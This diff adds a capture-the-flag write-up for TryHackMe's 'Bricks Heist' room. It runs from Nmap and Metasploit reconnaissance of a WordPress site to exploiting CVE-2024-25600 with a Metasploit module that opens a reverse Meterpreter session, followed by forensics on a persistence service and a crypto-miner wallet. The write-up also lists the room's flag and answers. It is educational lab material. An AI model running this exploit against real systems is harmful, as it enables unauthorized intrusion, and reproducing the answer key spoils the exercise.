@@ -1,0 +1,315 @@
+
+-----
+
+# 🧱 TryHackMe: Bricks Heist - CTF Write-up
+
+## 📌 Table of Contents
+
+  * [Overview](https://www.google.com/search?q=%23-overview)
+  * [Tool Installation Guide](https://www.google.com/search?q=%23-tool-installation-guide-windows--linux)
+  * [Phase 1: Reconnaissance & Enumeration](https://www.google.com/search?q=%23-phase-1-reconnaissance--enumeration)
+  * [Phase 2: Exploitation & Initial Access](https://www.google.com/search?q=%23-phase-2-exploitation--initial-access)
+  * [Phase 3: Post-Exploitation & Forensic Analysis](https://www.google.com/search?q=%23-phase-3-post-exploitation--forensic-analysis)
+  * [Investigation Summary](https://www.google.com/search?q=%23-investigation-summary)
+
+-----
+
+## 📝 Overview
+
+> **Room:** Bricks Heist  
+> **Difficulty:** Easy 🟢  
+> **Topics:** Web Exploitation, CVE-2024-25600, Incident Response, Malware Forensic Analysis, Threat Attribution
+
+**Scenario:** We are tasked with investigating a compromised web server and identifying how the attacker gained access, what actions were performed, and attributing the threat.
+
+-----
+
+# 🧰 Tool Installation Guide (Windows & Linux)
+
+## 📝 Overview
+
+> This section outlines the installation process for the tools used in the Bricks Heist investigation. The setup is performed in a controlled lab environment for ethical hacking and security testing.
+
+**Tools Covered:**
+
+  * Metasploit Framework
+  * Nmap
+
+-----
+
+## 🪟 Windows Installation
+
+### 1\. Installing Metasploit Framework
+
+Metasploit can be installed on Windows using the official installer provided by Rapid7.
+
+**Steps:**
+
+1.  Visit the official Metasploit website
+2.  Download the Windows installer (`.exe`)
+3.  Run the installer
+4.  Follow the setup wizard (default settings recommended)
+5.  Complete installation
+
+**Launching Metasploit:**
+
+```bash
+msfconsole
+```
+
+-----
+
+### 2\. Installing Nmap
+
+Nmap is used for network scanning and service enumeration.
+
+**Steps:**
+
+1.  Download Nmap from the official website
+2.  Run the installer
+3.  Accept default configurations
+4.  Complete installation
+
+**Verify Installation:**
+
+```bash
+nmap --version
+```
+
+-----
+
+## 🐧 Linux Installation (Kali Linux / Ubuntu)
+
+### 1\. Installing Metasploit Framework
+
+```bash
+sudo apt update
+sudo apt install metasploit-framework
+```
+
+**Launch Metasploit:**
+
+```bash
+msfconsole
+```
+
+-----
+
+### 2\. Installing Nmap
+
+```bash
+sudo apt install nmap
+```
+
+**Verify Installation:**
+
+```bash
+nmap --version
+```
+
+-----
+
+## 🖥️ Lab Environment Setup
+
+### Recommended Setup:
+
+  * **Attacker Machine:** Kali Linux
+  * **Target Machine:** Vulnerable VM (e.g., WordPress server)
+  * **Virtualization Software:** VirtualBox or VMware
+
+### Network Configuration:
+
+  * Host-only network (preferred for isolation)
+  * NAT (optional for internet access)
+
+> ⚠️ **Warning:** Always perform penetration testing in a controlled and authorized lab environment.
+
+-----
+
+## 🔍 Phase 1: Reconnaissance & Enumeration
+
+### 1\. Port Scanning (Nmap)
+
+```bash
+nmap -sC -sV MACHINE_IP bricks
+```
+
+**Output Snippet:**
+
+```text
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH
+80/tcp   open  http     Python http.server
+443/tcp  open  ssl/http Apache httpd
+3306/tcp open  mysql    MySQL
+```
+
+#### 🔍 Nmap Command for Apache + WordPress Detection
+
+```bash
+nmap -p 80,443 -sV --script=http-enum,http-headers,http-wordpress-enum TARGET_IP
+```
+
+#### 🧠 What This Does
+
+  * `-p 80,443` → Scan web ports
+  * `-sV` → Detect service versions (e.g., Apache version)
+  * `http-enum` → Finds web directories (like /wp-admin)
+  * `http-headers` → Checks server headers (may reveal WordPress clues)
+  * `http-wordpress-enum` → Attempts WordPress detection
+
+#### 📊 Example Output (What You Want to See)
+
+```text
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-wordpress-enum:
+|    WordPress version: 6.5
+|    Themes:
+|      - bricks
+|_   Users: administrator
+```
+
+-----
+
+### 2\. Web Vulnerability Scanning (Metasploit)
+
+```bash
+msfconsole
+use auxiliary/scanner/http/wordpress_scanner
+set RHOSTS bricks.thm
+set SSL true
+set RPORT 443
+run
+```
+
+**Key Findings:**
+
+  * WordPress detected
+  * Bricks theme version 5.4
+  * Username: administrator
+
+-----
+
+## 🚪 Phase 2: Exploitation & Initial Access
+
+### Exploiting CVE-2024-25600 (RCE)
+
+```bash
+use exploit/multi/http/wp_bricks_builder_rce
+set RHOSTS MACHINE_IP
+set LHOST YOUR_IP
+set SSL true
+set RPORT 443
+exploit
+```
+
+**Result:**
+
+  * Meterpreter session established
+  * Access gained as `apache` user
+
+-----
+
+## 🕵️ Phase 3: Post-Exploitation & Forensic Analysis
+
+### 🔎 Finding the Flag
+
+```bash
+cat /data/www/default/650c844110baced87e1606453b93f22a.txt
+```
+
+-----
+
+### ⚠️ Identifying Suspicious Process
+
+```bash
+ps
+```
+
+**Suspicious Process:**
+
+  * `nm-inet-dialog`
+
+-----
+
+### 🔁 Persistence Mechanism
+
+```bash
+cat /etc/systemd/system/ubuntu.service
+```
+
+**Service Identified:**
+
+  * `ubuntu.service`
+
+-----
+
+### 🧪 Malware Analysis
+
+```bash
+cat /lib/NetworkManager/inet.conf
+```
+
+**Log File:**
+
+  * `inet.conf`
+
+-----
+
+### 💰 Wallet Extraction
+
+```bash
+echo "[HEX_STRING]" | xxd -r -p | base64 -d | base64 -d
+```
+
+**Extracted Wallet:**
+
+  * `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`
+
+-----
+
+### 🧠 Threat Attribution
+
+  * Associated Threat Group: **LockBit**
+
+-----
+
+## 🏁 Investigation Summary
+
+| Task | Answer |
+| :--- | :--- |
+| **Hidden Flag** | `THM{fl46_650c844110baced87e1606453b93f22a}` |
+| **Suspicious Process** | `nm-inet-dialog` |
+| **Service Name** | `ubuntu.service` |
+| **Log File** | `inet.conf` |
+| **Wallet Address** | `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa` |
+| **Threat Group** | **LockBit** |
+
+-----
+
+## ✅ Conclusion
+
+This investigation demonstrated a full attack lifecycle:
+
+  * Reconnaissance and scanning
+  * Vulnerability identification
+  * Exploitation using Metasploit
+  * Post-exploitation analysis
+  * Threat attribution
+
+It highlights the importance of:
+
+  * Regular patching
+  * Monitoring systems
+  * Securing web applications
+
+-----
+
+## 📚 Reference
+
+  * TryHackMe – Bricks Heist Room
+  * Original Write-up: [https://github.com/WisdomWashe/cybersec/blob/main/WriteUps/Bricks-Heist-Writeup.md](https://github.com/WisdomWashe/cybersec/blob/main/WriteUps/Bricks-Heist-Writeup.md)
+
+-----
+
